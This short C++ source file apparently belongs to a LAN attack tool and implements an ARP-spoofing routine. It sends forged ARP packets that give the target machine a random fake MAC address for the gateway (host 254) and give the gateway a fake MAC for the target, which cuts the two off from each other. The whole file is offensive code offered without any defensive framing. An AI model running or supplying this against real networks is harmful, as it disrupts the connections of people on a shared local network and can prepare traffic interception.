#include "arpattacker.h"
#include <QDebug>
#include "LANAttacker/lanpcap.h"





void ArpAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
{
    LANHostInfo GateHost= GetLANPCap()->GetHostInfo(254);

    //deceice the targethost with fake gateway mac address
    GetLANPCap()->SendArpReplyPacket(TargetHost,GateHost.CreateRandomMacAddrHost());

    //deceive the gateway with fake targethost
     LANHostInfo FakeTargetHost=TargetHost.CreateRandomMacAddrHost();
    GetLANPCap()->SendArpRequestPacket(FakeTargetHost,GateHost);
}


